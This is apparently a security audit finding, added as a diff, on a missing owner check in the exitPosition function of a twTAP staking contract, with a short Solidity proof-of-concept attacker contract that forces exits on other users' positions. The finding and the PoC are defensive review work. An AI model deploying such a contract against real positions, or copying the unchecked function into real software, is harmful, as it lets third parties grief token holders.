@@ -1,0 +1,51 @@
+Below is one example of a potential access‐control “bug” that you should be aware of. (Note that in many cases the designers intend to let anyone trigger certain updates; however, if the intent is to let only the token owner initiate an exit, then the following is a problem.) 
+
+────────────────────────────────────────
+1. Function exitPosition (≈line 240–245)
+────────────────────────────────────────
+Issue: There is no access–control check in exitPosition. In this function the contract does not require that the caller be the token’s owner (or approved), even though it releases the locked TAP. (Instead, it simply reads the ownerOf(_tokenId) and sends the TAP funds to that address.) 
+
+Reason: Although the TAP is released to the token owner (and not to the caller), the fact that anyone may trigger exitPosition means that a malicious third party could force the execution of the “exit” logic on behalf of an unsuspecting user. For example, if the owner has planned to exit later or in a controlled fashion, an attacker might front–run the owner (or trigger exit repeatedly on expired positions) and force state changes in the underlying twAML participation. In other words, even if there is no direct loss of funds (since they still go to the owner), such a “forced exit” may have unintended consequences (or contribute to griefing/denial‐of‐service issues) when exit processing is meant to be initiated only by the owner.
+
+────────────────────────────────────────
+Proof of Concept
+────────────────────────────────────────
+A minimal attacker contract could be written to “force” an exit on someone else’s expired position. For example:
+
+------------------------------------------------------------
+pragma solidity 0.8.18;
+
+interface ITwTAP {
+    function exitPosition(uint256 _tokenId) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+}
+
+contract AttackForceExit {
+    ITwTAP public twTAP;
+
+    constructor(address _twTAPAddress) {
+        twTAP = ITwTAP(_twTAPAddress);
+    }
+
+    // Anyone (including an attacker) can call this to force an exit of token with tokenId,
+    // even if the token owner did not call it.
+    function forceExit(uint256 _tokenId) external {
+        // Caller does not need to be token owner!
+        twTAP.exitPosition(_tokenId);
+    }
+
+    // Just to illustrate that the funds will go to the token owner, not msg.sender:
+    function checkOwner(uint256 _tokenId) external view returns (address) {
+        return twTAP.ownerOf(_tokenId);
+    }
+}
+------------------------------------------------------------
+
+In this PoC the attacker does not “steal” the TAP (since _releaseTap sends the funds to ownerOf(tokenId)) but may force the exit at a time that disadvantages the token holder.
+
+────────────────────────────────────────
+Conclusion
+────────────────────────────────────────
+If the design’s intent was that only the token owner (or an approved party) could trigger the exit (and therefore the release of the locked TAP), then exitPosition should include an access–control check (for example, by calling _requireClaimPermission as in claimRewards or releaseTap). Otherwise, even though the funds are ultimately transferred correctly, the possibility that any third party may force an exit may be considered an access control issue (especially in scenarios where the timing of exit affects governance or rewards calculations). 
+
+Make sure to review whether this “open” exit behavior is intended.
